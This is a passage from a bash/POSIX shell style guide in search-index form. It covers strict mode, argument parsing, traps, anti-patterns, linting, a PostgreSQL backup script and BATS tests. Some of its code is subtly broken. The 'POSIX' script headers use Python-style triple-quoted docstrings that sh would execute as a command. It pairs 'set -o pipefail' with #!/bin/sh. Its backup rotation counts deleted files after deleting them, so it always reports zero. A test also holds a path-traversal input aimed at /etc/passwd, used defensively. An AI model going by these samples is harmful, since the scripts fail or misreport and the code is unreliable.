<pre><code>#!/bin/sh\n## Good - POSIX compliant shebang\n</code></pre> <pre><code>#!/usr/bin/env bash\n## Acceptable - When bash-specific features are needed\n## Document bash requirement in README\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#bash-only-features-to-avoid","title":"Bash-only Features to Avoid","text":"<pre><code>## Bad - Bash-specific array syntax\ndeclare -a my_array=(\"item1\" \"item2\")\n\n## Bad - Bash-specific [[ ]] test\nif [[ \"$var\" == \"value\" ]]; then\n  echo \"match\"\nfi\n\n## Good - POSIX compliant [ ] test\nif [ \"$var\" = \"value\" ]; then\n  echo \"match\"\nfi\n\n## Bad - Bash process substitution\ndiff &lt;(command1) &lt;(command2)\n\n## Good - Use temporary files\ncommand1 &gt; /tmp/file1\ncommand2 &gt; /tmp/file2\ndiff /tmp/file1 /tmp/file2\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#script-header-and-metadata","title":"Script Header and Metadata","text":"<p>Every script must start with a header including metadata and error handling:</p> <pre><code>#!/bin/sh\n\"\"\"\n@module deploy_application\n@description Deploys application to production environment\n@dependencies curl, jq, docker\n@version 1.2.0\n@author Tyler Dukes\n@last_updated 2025-10-28\n\"\"\"\n\n## Strict error handling\nset -o errexit   # Exit on error\nset -o nounset   # Exit on undefined variable\nset -o pipefail  # Catch errors in pipelines\n\n## Script constants\nreadonly SCRIPT_NAME=\"$(basename \"$0\")\"\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"$0\")\" &amp;&amp; pwd)\"\nreadonly LOG_FILE=\"/var/log/${SCRIPT_NAME}.log\"\n\n## Color codes for output\nreadonly RED='\\033[0;31m'\nreadonly GREEN='\\033[0;32m'\nreadonly YELLOW='\\033[1;33m'\nreadonly NC='\\033[0m' # No Color\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#set-options-explained","title":"Set Options Explained","text":"<pre><code>set -o errexit    # Exit immediately if a command exits with non-zero status\nset -o nounset    # Treat unset variables as errors\nset -o pipefail   # Return exit status of last failed command in pipeline\n\n## Alternative short form\nset -euo pipefail\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#function-definitions","title":"Function Definitions","text":"<p>Use functions for reusable code blocks:</p> <pre><code>## Function definition - no 'function' keyword for POSIX compliance\nlog_info() {\n  local message=\"$1\"\n  echo \"${GREEN}[INFO]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $message\" &gt;&amp;2\n}\n\nlog_error() {\n  local message=\"$1\"\n  echo \"${RED}[ERROR]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $message\" &gt;&amp;2\n}\n\nlog_warning() {\n  local message=\"$1\"\n  echo \"${YELLOW}[WARNING]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $message\" &gt;&amp;2\n}\n\n## Function with return value\ncheck_command_exists() {\n  local cmd=\"$1\"\n  if command -v \"$cmd\" &gt;/dev/null 2&gt;&amp;1; then\n    return 0\n  else\n    return 1\n  fi\n}\n\n## Function with multiple parameters\ndeploy_service() {\n  local service_name=\"$1\"\n  local environment=\"$2\"\n  local version=\"${3:-latest}\"  # Default to 'latest'\n\n  log_info \"Deploying $service_name to $environment (version: $version)\"\n\n  # Deployment logic here\n  if docker pull \"$service_name:$version\"; then\n    log_info \"Successfully pulled $service_name:$version\"\n    return 0\n  else\n    log_error \"Failed to pull $service_name:$version\"\n    return 1\n  fi\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#argument-parsing","title":"Argument Parsing","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#simple-argument-parsing","title":"Simple Argument Parsing","text":"<pre><code>show_help() {\n  cat &lt;&lt; EOF\nUsage: $SCRIPT_NAME [OPTIONS] &lt;environment&gt;\n\nDeploy application to specified environment\n\nARGUMENTS:\n    environment    Target environment (dev|staging|prod)\n\nOPTIONS:\n    -h, --help          Show this help message\n    -v, --version       Show script version\n    -d, --dry-run       Run in dry-run mode\n    -f, --force         Force deployment without confirmation\n\nEXAMPLES:\n    $SCRIPT_NAME staging\n    $SCRIPT_NAME --dry-run prod\n    $SCRIPT_NAME -f staging\n\nEOF\n}\n\n## Parse command-line arguments\nparse_arguments() {\n  DRY_RUN=false\n  FORCE=false\n  ENVIRONMENT=\"\"\n\n  while [ $# -gt 0 ]; do\n    case \"$1\" in\n      -h|--help)\n        show_help\n        exit 0\n        ;;\n      -v|--version)\n        echo \"$SCRIPT_NAME version 1.2.0\"\n        exit 0\n        ;;\n      -d|--dry-run)\n        DRY_RUN=true\n        shift\n        ;;\n      -f|--force)\n        FORCE=true\n        shift\n        ;;\n      -*)\n        log_error \"Unknown option: $1\"\n        show_help\n        exit 1\n        ;;\n      *)\n        ENVIRONMENT=\"$1\"\n        shift\n        ;;\n    esac\n  done\n\n  # Validate required arguments\n  if [ -z \"$ENVIRONMENT\" ]; then\n    log_error \"Environment argument is required\"\n    show_help\n    exit 1\n  fi\n\n  # Validate environment value\n  case \"$ENVIRONMENT\" in\n    dev|staging|prod)\n      ;;\n    *)\n      log_error \"Invalid environment: $ENVIRONMENT (must be dev, staging, or prod)\"\n      exit 1\n      ;;\n  esac\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#error-handling","title":"Error Handling","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#trap-signals-for-cleanup","title":"Trap Signals for Cleanup","text":"<pre><code>## Cleanup function\ncleanup() {\n  local exit_code=$?\n\n  log_info \"Cleaning up temporary files...\"\n  rm -f \"$TEMP_FILE\"\n  rm -rf \"$TEMP_DIR\"\n\n  if [ $exit_code -ne 0 ]; then\n    log_error \"Script failed with exit code $exit_code\"\n  else\n    log_info \"Script completed successfully\"\n  fi\n\n  exit $exit_code\n}\n\n## Register cleanup trap\ntrap cleanup EXIT INT TERM\n\n## Create temporary files\nTEMP_FILE=$(mktemp)\nTEMP_DIR=$(mktemp -d)\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#error-handling-patterns","title":"Error Handling Patterns","text":"<pre><code>## Check command success\nif ! check_command_exists \"docker\"; then\n  log_error \"docker is not installed\"\n  exit 1\nfi\n\n## Capture command output and check status\nif output=$(docker ps 2&gt;&amp;1); then\n  log_info \"Docker is running\"\nelse\n  log_error \"Docker command failed: $output\"\n  exit 1\nfi\n\n## Conditional execution with error messages\ndocker pull \"$IMAGE_NAME\" || {\n  log_error \"Failed to pull Docker image $IMAGE_NAME\"\n  exit 1\n}\n\n## Use subshell to prevent exit on error\nif (set -e; command1 &amp;&amp; command2 &amp;&amp; command3); then\n  log_info \"All commands succeeded\"\nelse\n  log_error \"One or more commands failed\"\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#temporary-file-handling","title":"Temporary File Handling","text":"<p>Always use <code>mktemp</code> for temporary files and ensure cleanup:</p> <pre><code>## Create temporary file\nTEMP_FILE=$(mktemp) || {\n  log_error \"Failed to create temporary file\"\n  exit 1\n}\n\n## Create temporary directory\nTEMP_DIR=$(mktemp -d) || {\n  log_error \"Failed to create temporary directory\"\n  exit 1\n}\n\n## Ensure cleanup on exit\ntrap 'rm -f \"$TEMP_FILE\"; rm -rf \"$TEMP_DIR\"' EXIT\n\n## Use temporary file\necho \"data\" &gt; \"$TEMP_FILE\"\nprocess_file \"$TEMP_FILE\"\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#string-manipulation","title":"String Manipulation","text":"<pre><code>## Variable assignment\nname=\"John Doe\"\n\n## String length\nlength=${#name}\n\n## Substring extraction (not POSIX - use cut/awk instead for portability)\n## ${variable:offset:length} is bash-specific\n\n## POSIX-compliant substring with cut\nfirst_name=$(echo \"$name\" | cut -d' ' -f1)\n\n## String replacement (use sed for POSIX)\n## ${variable/pattern/replacement} is bash-specific\n\n## POSIX-compliant replacement\nnew_name=$(echo \"$name\" | sed 's/John/Jane/')\n\n## Case conversion (use tr for POSIX)\nupper_name=$(echo \"$name\" | tr '[:lower:]' '[:upper:]')\nlower_name=$(echo \"$name\" | tr '[:upper:]' '[:lower:]')\n\n## String concatenation\nfull_path=\"${directory}/${filename}\"\n\n## Default values\ndatabase_host=\"${DB_HOST:-localhost}\"\ndatabase_port=\"${DB_PORT:-5432}\"\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#conditional-statements","title":"Conditional Statements","text":"<pre><code>## Basic if statement\nif [ \"$ENVIRONMENT\" = \"prod\" ]; then\n  log_warning \"Deploying to production\"\nfi\n\n## If-else\nif [ -f \"$config_file\" ]; then\n  log_info \"Config file found: $config_file\"\nelse\n  log_error \"Config file not found: $config_file\"\n  exit 1\nfi\n\n## If-elif-else\nif [ \"$status_code\" -eq 200 ]; then\n  log_info \"Request successful\"\nelif [ \"$status_code\" -eq 404 ]; then\n  log_error \"Resource not found\"\nelif [ \"$status_code\" -ge 500 ]; then\n  log_error \"Server error\"\nelse\n  log_warning \"Unexpected status code: $status_code\"\nfi\n\n## Test operators\n[ -f \"$file\" ]       # File exists and is regular file\n[ -d \"$dir\" ]        # Directory exists\n[ -z \"$var\" ]        # String is empty\n[ -n \"$var\" ]        # String is not empty\n[ \"$a\" = \"$b\" ]      # Strings are equal\n[ \"$a\" != \"$b\" ]     # Strings are not equal\n[ \"$a\" -eq \"$b\" ]    # Numbers are equal\n[ \"$a\" -ne \"$b\" ]    # Numbers are not equal\n[ \"$a\" -lt \"$b\" ]    # a less than b\n[ \"$a\" -le \"$b\" ]    # a less than or equal to b\n[ \"$a\" -gt \"$b\" ]    # a greater than b\n[ \"$a\" -ge \"$b\" ]    # a greater than or equal to b\n\n## Logical operators\n[ -f \"$file\" ] &amp;&amp; [ -r \"$file\" ]   # AND\n[ -f \"$file\" ] || [ -d \"$dir\" ]    # OR\n[ ! -f \"$file\" ]                    # NOT\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#loops","title":"Loops","text":"<pre><code>## For loop with list\nfor env in dev staging prod; do\n  log_info \"Deploying to $env\"\n  deploy_to_environment \"$env\"\ndone\n\n## For loop with command output\nfor file in *.txt; do\n  if [ -f \"$file\" ]; then\n    process_file \"$file\"\n  fi\ndone\n\n## For loop with range (use seq for POSIX)\nfor i in $(seq 1 5); do\n  echo \"Iteration $i\"\ndone\n\n## While loop\ncount=0\nwhile [ $count -lt 10 ]; do\n  log_info \"Count: $count\"\n  count=$((count + 1))\ndone\n\n## Read file line by line\nwhile IFS= read -r line; do\n  process_line \"$line\"\ndone &lt; \"$input_file\"\n\n## Until loop\nuntil check_service_health; do\n  log_info \"Waiting for service to be healthy...\"\n  sleep 5\ndone\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#here-documents","title":"HERE Documents","text":"<pre><code>## Basic HERE document\ncat &lt;&lt; EOF\nThis is a multi-line\ntext block that will\nbe printed as-is\nEOF\n\n## HERE document with variable expansion\ncat &lt;&lt; EOF\nEnvironment: $ENVIRONMENT\nDeployment time: $(date)\nUser: $USER\nEOF\n\n## HERE document without variable expansion (quoted delimiter)\ncat &lt;&lt; 'EOF'\nThis will not expand $VARIABLES\nUse this for literal text\nEOF\n\n## HERE document to file\ncat &lt;&lt; EOF &gt; config.yaml\n---\nenvironment: $ENVIRONMENT\ndatabase:\n  host: $DB_HOST\n  port: $DB_PORT\nEOF\n\n## HERE document to command\ndocker run -i myimage &lt;&lt; EOF\ncommand1\ncommand2\ncommand3\nEOF\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#command-substitution","title":"Command Substitution","text":"<pre><code>## Modern command substitution (POSIX)\ncurrent_date=$(date '+%Y-%m-%d')\nfile_count=$(ls -1 | wc -l)\ngit_branch=$(git rev-parse --abbrev-ref HEAD)\n\n## Nested command substitution\nproject_root=$(cd \"$(dirname \"$0\")/..\" &amp;&amp; pwd)\n\n## Capture command output and status\nif output=$(docker ps 2&gt;&amp;1); then\n  log_info \"Docker running with $(echo \"$output\" | wc -l) containers\"\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#arrays-use-carefully-bash-specific","title":"Arrays (Use Carefully - Bash-specific)","text":"<p>For POSIX compliance, use whitespace-separated strings or multiple variables:</p> <pre><code>## POSIX-compliant approach - avoid arrays\nenvironments=\"dev staging prod\"\nfor env in $environments; do\n  echo \"$env\"\ndone\n\n## If you MUST use arrays (bash-only), document the requirement\n#!/bin/bash  # Note: requires bash, not POSIX sh\n\n## Bash array declaration\ndeclare -a servers=(\"server1\" \"server2\" \"server3\")\n\n## Array iteration\nfor server in \"${servers[@]}\"; do\n  echo \"Processing $server\"\ndone\n\n## Array length\ncount=${#servers[@]}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#anti-patterns","title":"Anti-Patterns","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-unquoted-variables","title":"\u274c Avoid: Unquoted Variables","text":"<pre><code>## Bad - Word splitting and globbing issues\nfile=$1\nif [ -f $file ]; then  # Breaks with spaces in filename\n  cat $file\nfi\n\n## Good - Always quote variables\nfile=\"$1\"\nif [ -f \"$file\" ]; then\n  cat \"$file\"\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-using-eval","title":"\u274c Avoid: Using <code>eval</code>","text":"<pre><code>## Bad - Security risk, arbitrary code execution\nuser_input=\"$1\"\neval \"$user_input\"\n\n## Good - Use explicit commands\ncase \"$command\" in\n  start) start_service ;;\n  stop)  stop_service ;;\n  *)     log_error \"Unknown command\" ;;\nesac\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-parsing-ls-output","title":"\u274c Avoid: Parsing ls Output","text":"<pre><code>## Bad - Breaks with spaces, special characters\nfor file in $(ls *.txt); do\n  echo \"$file\"\ndone\n\n## Good - Use glob patterns\nfor file in *.txt; do\n  if [ -f \"$file\" ]; then\n    echo \"$file\"\n  fi\ndone\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-useless-cat","title":"\u274c Avoid: Useless cat","text":"<pre><code>## Bad - Unnecessary use of cat\ncat file.txt | grep \"pattern\"\n\n## Good - Direct input redirection\ngrep \"pattern\" file.txt\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-test-with","title":"\u274c Avoid: Test with ==","text":"<pre><code>## Bad - Not POSIX compliant\nif [ \"$var\" == \"value\" ]; then\n  echo \"match\"\nfi\n\n## Good - POSIX single =\nif [ \"$var\" = \"value\" ]; then\n  echo \"match\"\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-ignoring-exit-codes","title":"\u274c Avoid: Ignoring Exit Codes","text":"<pre><code>## Bad - No error checking\ncurl -o file.txt https://example.com/file.txt\nprocess_file file.txt\n\n## Good - Check exit codes\nif curl -o file.txt https://example.com/file.txt; then\n  process_file file.txt\nelse\n  log_error \"Failed to download file\"\n  exit 1\nfi\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#avoid-using-cd-without-checks","title":"\u274c Avoid: Using cd Without Checks","text":"<pre><code>## Bad - cd might fail\ncd /some/directory\nrm -rf *\n\n## Good - Check cd success\nif ! cd /some/directory; then\n  log_error \"Failed to change directory\"\n  exit 1\nfi\nrm -rf *\n\n## Better - Use subshell\n(\n  cd /some/directory || exit 1\n  rm -rf *\n)\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#tool-configuration","title":"Tool Configuration","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#shellcheck","title":"shellcheck","text":"<p><code>.shellcheckrc</code>:</p> <pre><code>## Disable specific warnings\ndisable=SC2034  # Unused variable\ndisable=SC2086  # Unquoted variable (if intentional)\n\n## Enable all optional checks\nenable=all\n\n## Specify shell dialect\nshell=sh\n</code></pre> <p>Run shellcheck:</p> <pre><code>shellcheck script.sh\nshellcheck -x script.sh  # Follow source files\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#shfmt","title":"shfmt","text":"<p><code>.editorconfig</code>:</p> <pre><code>[*.sh]\nindent_style = space\nindent_size = 2\nshell_variant = posix\n</code></pre> <p>Format scripts:</p> <pre><code>shfmt -w script.sh         # Format in place\nshfmt -i 2 -s script.sh    # 2-space indent, simplify\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#pre-commit-hook","title":"Pre-commit Hook","text":"<p><code>.pre-commit-config.yaml</code>:</p> <pre><code>repos:\n  - repo: https://github.com/shellcheck-py/shellcheck-py\n    rev: v0.9.0.5\n    hooks:\n      - id: shellcheck\n\n  - repo: https://github.com/scop/pre-commit-shfmt\n    rev: v3.7.0-1\n    hooks:\n      - id: shfmt\n        args: [-w, -i, \"2\", -s]\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#complete-script-example","title":"Complete Script Example","text":"<pre><code>#!/bin/sh\n\"\"\"\n@module database_backup\n@description Automated PostgreSQL database backup with rotation\n@dependencies pg_dump, gzip, aws-cli\n@version 1.0.0\n@author Tyler Dukes\n@last_updated 2025-10-28\n\"\"\"\n\n## Strict error handling\nset -o errexit\nset -o nounset\nset -o pipefail\n\n## Constants\nreadonly SCRIPT_NAME=\"$(basename \"$0\")\"\nreadonly SCRIPT_DIR=\"$(cd \"$(dirname \"$0\")\" &amp;&amp; pwd)\"\nreadonly BACKUP_DIR=\"/var/backups/postgres\"\nreadonly RETENTION_DAYS=7\nreadonly S3_BUCKET=\"s3://my-backups/postgres\"\n\n## Color codes\nreadonly RED='\\033[0;31m'\nreadonly GREEN='\\033[0;32m'\nreadonly YELLOW='\\033[1;33m'\nreadonly NC='\\033[0m'\n\n## Logging functions\nlog_info() {\n  echo \"${GREEN}[INFO]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $1\" &gt;&amp;2\n}\n\nlog_error() {\n  echo \"${RED}[ERROR]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $1\" &gt;&amp;2\n}\n\nlog_warning() {\n  echo \"${YELLOW}[WARNING]${NC} $(date '+%Y-%m-%d %H:%M:%S') - $1\" &gt;&amp;2\n}\n\n## Cleanup function\ncleanup() {\n  local exit_code=$?\n\n  log_info \"Cleaning up temporary files...\"\n  rm -f \"$TEMP_FILE\"\n\n  if [ $exit_code -ne 0 ]; then\n    log_error \"Backup failed with exit code $exit_code\"\n  fi\n\n  exit $exit_code\n}\n\n## Register cleanup trap\ntrap cleanup EXIT INT TERM\n\n## Check prerequisites\ncheck_prerequisites() {\n  local missing_deps=\"\"\n\n  for cmd in pg_dump gzip aws; do\n    if ! command -v \"$cmd\" &gt;/dev/null 2&gt;&amp;1; then\n      missing_deps=\"$missing_deps $cmd\"\n    fi\n  done\n\n  if [ -n \"$missing_deps\" ]; then\n    log_error \"Missing dependencies:$missing_deps\"\n    return 1\n  fi\n\n  return 0\n}\n\n## Create backup\ncreate_backup() {\n  local database=\"$1\"\n  local timestamp=$(date '+%Y%m%d_%H%M%S')\n  local backup_file=\"${BACKUP_DIR}/${database}_${timestamp}.sql.gz\"\n\n  log_info \"Creating backup of database: $database\"\n\n  # Create backup directory if needed\n  mkdir -p \"$BACKUP_DIR\"\n\n  # Create backup\n  if pg_dump \"$database\" | gzip &gt; \"$backup_file\"; then\n    log_info \"Backup created: $backup_file\"\n    echo \"$backup_file\"\n    return 0\n  else\n    log_error \"Failed to create backup\"\n    return 1\n  fi\n}\n\n## Upload to S3\nupload_to_s3() {\n  local backup_file=\"$1\"\n  local s3_path=\"${S3_BUCKET}/$(basename \"$backup_file\")\"\n\n  log_info \"Uploading backup to S3: $s3_path\"\n\n  if aws s3 cp \"$backup_file\" \"$s3_path\"; then\n    log_info \"Backup uploaded successfully\"\n    return 0\n  else\n    log_error \"Failed to upload backup to S3\"\n    return 1\n  fi\n}\n\n## Rotate old backups\nrotate_backups() {\n  log_info \"Rotating backups older than $RETENTION_DAYS days\"\n\n  find \"$BACKUP_DIR\" -name \"*.sql.gz\" -type f -mtime +$RETENTION_DAYS -delete\n\n  local deleted_count=$(find \"$BACKUP_DIR\" -name \"*.sql.gz\" -type f -mtime +$RETENTION_DAYS | wc -l)\n  log_info \"Deleted $deleted_count old backup(s)\"\n}\n\n## Main function\nmain() {\n  local database=\"${1:-myapp_production}\"\n\n  log_info \"Starting database backup process\"\n\n  # Check prerequisites\n  if ! check_prerequisites; then\n    exit 1\n  fi\n\n  # Create temporary file\n  TEMP_FILE=$(mktemp)\n\n  # Create backup\n  if backup_file=$(create_backup \"$database\"); then\n    log_info \"Backup created successfully\"\n  else\n    exit 1\n  fi\n\n  # Upload to S3\n  if upload_to_s3 \"$backup_file\"; then\n    log_info \"Upload successful\"\n  else\n    log_warning \"Upload failed, backup kept locally\"\n  fi\n\n  # Rotate old backups\n  rotate_backups\n\n  log_info \"Backup process completed successfully\"\n}\n\n## Run main function with arguments\nmain \"$@\"\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#testing","title":"Testing","text":"","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#testing-framework-bats","title":"Testing Framework: BATS","text":"<p>Use BATS (Bash Automated Testing System) for testing shell scripts:</p> <pre><code>## Install BATS\ngit clone https://github.com/bats-core/bats-core.git\ncd bats-core\n./install.sh /usr/local\n\n## Or via package manager\nbrew install bats-core  # macOS\napt-get install bats    # Debian/Ubuntu\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#test-structure","title":"Test Structure","text":"<p>Organize tests in a <code>tests/</code> directory:</p> <pre><code>project/\n\u251c\u2500\u2500 scripts/\n\u2502   \u2514\u2500\u2500 deploy.sh\n\u251c\u2500\u2500 tests/\n\u2502   \u251c\u2500\u2500 test_helper.bash\n\u2502   \u251c\u2500\u2500 deploy.bats\n\u2502   \u2514\u2500\u2500 fixtures/\n\u2502       \u2514\u2500\u2500 sample_config.yaml\n\u2514\u2500\u2500 .bats-version\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#bats-test-example","title":"BATS Test Example","text":"<pre><code>## tests/deploy.bats\n#!/usr/bin/env bats\n\n# Load test helpers\nload test_helper\n\nsetup() {\n  # Run before each test\n  export TEST_DIR=\"$(mktemp -d)\"\n  export PATH=\"$BATS_TEST_DIRNAME/../scripts:$PATH\"\n}\n\nteardown() {\n  # Run after each test\n  rm -rf \"$TEST_DIR\"\n}\n\n@test \"deploy script exists and is executable\" {\n  run which deploy.sh\n  [ \"$status\" -eq 0 ]\n  [ -x \"$(which deploy.sh)\" ]\n}\n\n@test \"deploy fails without required environment variable\" {\n  run deploy.sh staging\n  [ \"$status\" -eq 1 ]\n  [[ \"$output\" =~ \"DB_HOST not set\" ]]\n}\n\n@test \"deploy succeeds with valid configuration\" {\n  export DB_HOST=\"localhost\"\n  export DB_PORT=\"5432\"\n\n  run deploy.sh staging\n  [ \"$status\" -eq 0 ]\n  [[ \"$output\" =~ \"Deployment successful\" ]]\n}\n\n@test \"validate_path rejects path traversal\" {\n  source ../scripts/deploy.sh\n\n  run validate_path \"../../../etc/passwd\"\n  [ \"$status\" -eq 1 ]\n  [[ \"$output\" =~ \"Path traversal detected\" ]]\n}\n\n@test \"log functions write to stderr\" {\n  source ../scripts/deploy.sh\n\n  run log_info \"test message\"\n  [ \"$status\" -eq 0 ]\n  # BATS captures stderr in $output when using run\n  [[ \"$output\" =~ \"test message\" ]]\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#test-helper-functions","title":"Test Helper Functions","text":"<pre><code>## tests/test_helper.bash\n\n# Common test setup\nexport FIXTURES=\"$BATS_TEST_DIRNAME/fixtures\"\n\n# Helper to check command exists\nassert_command_exists() {\n  local cmd=\"$1\"\n  command -v \"$cmd\" &gt;/dev/null 2&gt;&amp;1 || {\n    echo \"Required command not found: $cmd\"\n    return 1\n  }\n}\n\n# Helper to assert file contains string\nassert_file_contains() {\n  local file=\"$1\"\n  local pattern=\"$2\"\n\n  grep -q \"$pattern\" \"$file\" || {\n    echo \"File $file does not contain: $pattern\"\n    return 1\n  }\n}\n\n# Helper to mock external commands\nmock_command() {\n  local cmd_name=\"$1\"\n  local mock_script=\"$2\"\n\n  # Create mock in temporary bin directory\n  mkdir -p \"$TEST_DIR/bin\"\n  cat &gt; \"$TEST_DIR/bin/$cmd_name\" &lt;&lt; EOF\n#!/bin/sh\n$mock_script\nEOF\n  chmod +x \"$TEST_DIR/bin/$cmd_name\"\n  export PATH=\"$TEST_DIR/bin:$PATH\"\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#testing-script-functions","title":"Testing Script Functions","text":"<pre><code>## Example: Testing individual functions\n## tests/functions.bats\n#!/usr/bin/env bats\n\nload test_helper\n\nsetup() {\n  # Source the script to test individual functions\n  source \"$BATS_TEST_DIRNAME/../scripts/backup.sh\"\n}\n\n@test \"check_prerequisites detects missing commands\" {\n  # Mock command to return failure\n  mock_command \"pg_dump\" \"exit 1\"\n\n  run check_prerequisites\n  [ \"$status\" -eq 1 ]\n  [[ \"$output\" =~ \"Missing dependencies\" ]]\n}\n\n@test \"create_backup generates valid filename\" {\n  export BACKUP_DIR=\"$TEST_DIR/backups\"\n\n  run create_backup \"testdb\"\n  [ \"$status\" -eq 0 ]\n\n  # Check filename format: database_YYYYMMDD_HHMMSS.sql.gz\n  [[ \"$output\" =~ testdb_[0-9]{8}_[0-9]{6}.sql.gz ]]\n}\n\n@test \"rotate_backups removes old files\" {\n  export BACKUP_DIR=\"$TEST_DIR/backups\"\n  mkdir -p \"$BACKUP_DIR\"\n\n  # Create old backup file (8 days old)\n  old_backup=\"$BACKUP_DIR/old_backup.sql.gz\"\n  touch \"$old_backup\"\n  touch -t \"$(date -d '8 days ago' +%Y%m%d%H%M)\" \"$old_backup\"\n\n  # Create recent backup\n  recent_backup=\"$BACKUP_DIR/recent_backup.sql.gz\"\n  touch \"$recent_backup\"\n\n  run rotate_backups\n  [ \"$status\" -eq 0 ]\n\n  # Old backup should be deleted\n  [ ! -f \"$old_backup\" ]\n  # Recent backup should remain\n  [ -f \"$recent_backup\" ]\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#integration-testing","title":"Integration Testing","text":"<pre><code>## tests/integration.bats\n#!/usr/bin/env bats\n\nload test_helper\n\nsetup() {\n  export TEST_DIR=\"$(mktemp -d)\"\n  export PATH=\"$BATS_TEST_DIRNAME/../scripts:$PATH\"\n\n  # Setup test environment\n  export DB_HOST=\"localhost\"\n  export DB_PORT=\"5432\"\n  export ENVIRONMENT=\"test\"\n}\n\nteardown() {\n  rm -rf \"$TEST_DIR\"\n}\n\n@test \"full deployment workflow\" {\n  # Mock external dependencies\n  mock_command \"docker\" \"echo 'Image pulled successfully'\"\n  mock_command \"kubectl\" \"echo 'Deployment updated'\"\n\n  run deploy.sh test\n  [ \"$status\" -eq 0 ]\n\n  # Verify deployment steps occurred\n  [[ \"$output\" =~ \"Checking prerequisites\" ]]\n  [[ \"$output\" =~ \"Pulling Docker image\" ]]\n  [[ \"$output\" =~ \"Updating Kubernetes deployment\" ]]\n  [[ \"$output\" =~ \"Deployment successful\" ]]\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#running-tests","title":"Running Tests","text":"<pre><code>## Run all tests\nbats tests/\n\n## Run specific test file\nbats tests/deploy.bats\n\n## Run tests with verbose output\nbats --verbose tests/\n\n## Run tests with tap output (for CI/CD)\nbats --tap tests/\n\n## Run tests recursively\nbats --recursive tests/\n\n## Run tests with timing\nbats --timing tests/\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#shellcheck-integration","title":"ShellCheck Integration","text":"<p>Combine BATS with ShellCheck for comprehensive testing:</p> <pre><code>## tests/shellcheck.bats\n#!/usr/bin/env bats\n\n@test \"all scripts pass shellcheck\" {\n  for script in scripts/*.sh; do\n    run shellcheck \"$script\"\n    [ \"$status\" -eq 0 ]\n  done\n}\n\n@test \"scripts follow POSIX standards\" {\n  for script in scripts/*.sh; do\n    run shellcheck --shell=sh \"$script\"\n    [ \"$status\" -eq 0 ]\n  done\n}\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#cicd-integration","title":"CI/CD Integration","text":"<pre><code>## .github/workflows/test.yml\nname: Test Scripts\n\non: [push, pull_request]\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Install BATS\n        run: |\n          sudo apt-get update\n          sudo apt-get install -y bats\n\n      - name: Install ShellCheck\n        run: sudo apt-get install -y shellcheck\n\n      - name: Run BATS tests\n        run: bats --recursive --tap tests/\n\n      - name: Run ShellCheck\n        run: |\n          find scripts -name \"*.sh\" -exec shellcheck {} +\n\n      - name: Check script formatting\n        run: |\n          shfmt -d -i 2 -s scripts/\n</code></pre>","tags":["bash","shell","scripting","posix","automation"]},{"location":"02_language_guides/bash/#coverage-and-quality-metrics","title":"Coverage and Quality Metrics","text":"<p>While Bash doesn't have native coverage tools, you can 